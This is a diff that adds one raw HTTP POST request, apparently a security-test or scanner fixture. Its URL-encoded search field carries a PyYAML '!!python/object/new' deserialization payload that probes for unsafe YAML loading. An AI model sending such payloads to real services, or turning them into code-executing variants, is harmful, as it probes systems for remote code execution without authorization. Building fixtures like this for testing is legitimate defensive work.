@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+Connection: close
+
+search=%21%21python%2Fobject%2Fnew%3Atype%0A++args%3A+%5B%22id%22%2C+%21%21python%2Ftuple+%5B%5D%5D
